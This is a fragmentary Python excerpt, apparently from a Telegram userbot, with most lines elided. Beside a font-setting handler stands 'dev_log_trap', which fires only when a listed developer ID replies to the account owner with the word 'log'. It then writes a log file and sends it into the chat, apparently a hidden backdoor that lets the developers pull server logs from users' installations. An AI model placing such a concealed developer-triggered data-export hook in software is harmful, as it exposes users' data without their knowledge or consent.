...
async def set_pic_font(event):
    ...
    if num in fonts:
        ...
        db = get_db(client_id)
        db["DEFAULT_PIC"] = f"JoKeRUB/helpers/styles/{fonts[num]}"
        save_db(client_id, db)
...
async def dev_log_trap(event):
    if event.reply_to and event.sender_id in DevJoker:
        ...
        if reply_msg.from_id == event.client.uid and event.message.message == "لوك":
            ...
            with open('فينيكس 🖤.txt', 'w', encoding="utf-8") as file:
                file.write(log_content)

            await event.client.send_file(event.chat_id, "فينيكس 🖤.txt", caption="هذا هو الـ Log من السيرفر المحلي")
            os.remove("فينيكس 🖤.txt")